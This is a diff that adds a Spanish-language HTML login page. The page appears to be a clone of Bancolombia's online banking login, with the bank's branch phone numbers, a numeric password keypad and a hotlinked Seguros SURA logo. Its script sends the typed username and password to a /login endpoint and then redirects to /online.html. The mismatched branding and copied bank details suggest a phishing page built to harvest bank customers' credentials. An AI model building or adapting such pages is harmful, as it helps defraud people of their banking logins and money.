@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f4f4f4;
+            font-size: 16px; /* Establecer un tamaño de fuente base */
+        }
+
+        .header {
+            background-color: #ffffff;
+            justify-content: left;
+            padding: 20px 0;
+        }
+
+        .logo {
+            max-width: 100%; /* Hacer que el logo se ajuste automáticamente al ancho de su contenedor */
+        }
+
+        .datetime {
+            margin-top: 10px;
+        }
+
+        .login-section {
+            display: flex;
+            flex-direction: column; /* Cambiar a un diseño de columna para dispositivos móviles */
+            padding: 20px;
+        }
+
+        .left-section {
+            margin-bottom: 20px; /* Añadir espacio entre la sección izquierda y la siguiente */
+        }
+
+        .right-section img {
+            max-width: 100%; /* Hacer que la imagen de referencia se ajuste automáticamente al ancho de su contenedor */
+            height: auto; /* Mantener la proporción de la imagen */
+        }
+
+        .login-box {
+            background-color: #333; /* Cambiar el color de fondo a gris oscuro */
+            color: #fff;
+            padding: 10px;
+            margin-bottom: 10px;
+        }
+
+        input[type="text"],
+        input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin-top: 5px;
+            margin-bottom: 10px;
+            box-sizing: border-box; /* Incluir el relleno y el borde en el ancho total */
+        }
+
+        button {
+            background-color: #e0e0e0;
+            color: #000;
+            padding: 10px;
+            border: none;
+            cursor: pointer;
+            width: 100%; /* Hacer que los botones ocupen todo el ancho disponible */
+            font-size: 16px;
+            margin: 2px;
+        }
+
+        .keyboard {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            grid-gap: 2px;
+            margin-top: 10px;
+            justify-content: center;
+        }
+
+        .footer {
+            background-color: #000;
+            color: #fff;
+            padding: 20px;
+            text-align: center;
+            font-size: 14px; /* Reducir el tamaño de fuente del pie de página en dispositivos móviles */
+        }
+
+        button[type="submit"] {
+            background-color: rgb(0, 149, 255);
+            color: black;
+        }
+
+        @media screen and (min-width: 768px) {
+            .login-section {
+                flex-direction: row; /* Cambiar a un diseño de fila para pantallas más grandes */
+            }
+
+            .left-section {
+                flex: 0.3;
+                margin-right: 20px;
+            }
+
+            .right-section {
+                flex: 0.7;
+                position: relative;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <img src="https://www.uam.edu.co/wp-content/uploads/2022/09/Logo-Seguros-SURA-300x93.jpg" alt="Logo" class="logo">
+        <div class="datetime">
+            <span id="currentDateTime"></span>
+        </div>
+    </div>
+    <div class="login-section">
+        <div class="left-section">
+            <div class="login-box">
+                Usuario
+            </div>
+    
+        <div>
+            <label for="username">Username:</label>
+            <input type="text" id="username" name="username" required>
+        </div>
+        <div class="login-box">
+            Contraseña (solo números)
+        </div>
+        <div>
+            <label for="password">Password:</label>
+            <input type="password" id="password" name="password" required>
+        </div>
+    
+        <div class="keyboard">
+            <button onclick="appendNumber(1)">1</button>
+            <button onclick="appendNumber(2)">2</button>
+            <button onclick="appendNumber(3)">3</button>
+            <button onclick="appendNumber(4)">4</button>
+            <button onclick="appendNumber(5)">5</button>
+            <button onclick="appendNumber(6)">6</button>
+            <button onclick="appendNumber(7)">7</button>
+            <button onclick="appendNumber(8)">8</button>
+            <button onclick="appendNumber(9)">9</button>
+        </div>
+        <form id="loginForm">
+        <button type="submit">Login</button>
+        </form>
+    <a href="#">Olvidaste tu usuario</a><br>
+            <a href="#">Problemas para conectarte</a>
+        </div>
+    
+
+    <div class="right-section">
+        <img src="https://i.revistapym.com.co/cms/2024/07/29154910/7-3.jpg?w=412&d=2.625" alt="Imagen de referencia">
+    </div>
+</div>
+
+
+<div class="footer">
+    Sucursal Telefónica Bancolombia: Bogotá (57) 50 1 353 50 00 - Medellín (57) 60 2 510 91 00 - Cali (57) 60 9 624 05 05 - Barranquilla (57) 90 5 371 88 86 - Cartagena (57) 60 5 103 44 00 - Bucaramanga (57) 60 7 100 25 25 - Pereira (57) 60 6 670 12 13 - El resto del país 018000 9 562445. Sucursales Telefónicas en el exterior: España (34) 700 995 817 - Estados Unidos (1) 966 549 67 84.
+</div>
+
+
+    <script>
+        function appendNumber(number) {
+        const passwordField = document.querySelector('input[type="password"]');
+        passwordField.value += number;}
+
+
+        const currentDateTimeElement = document.getElementById('currentDateTime');
+
+        function updateDateTime() {
+        const now = new Date();
+        const options = { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric', hour: '2-digit', minute: '2-digit', second: '2-digit' };
+        const formattedDateTime = now.toLocaleDateString('es-ES', options);
+        currentDateTimeElement.textContent = formattedDateTime;
+    }
+    
+
+    updateDateTime();
+    setInterval(updateDateTime, 1000);
+
+    
+
+        document.getElementById('loginForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            const username = document.getElementById('username').value;
+            const password = document.getElementById('password').value;
+
+            const response = await fetch('/login', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify({ username, password })
+            });
+            
+            if (response.ok) {
+                sessionStorage.setItem('username', username);
+                
+                window.location.href = '/online.html'; } else {
+
+            const message = await response.text();
+            alert(message);}
+        
+        });
+    </script>
+</body>
+</html>
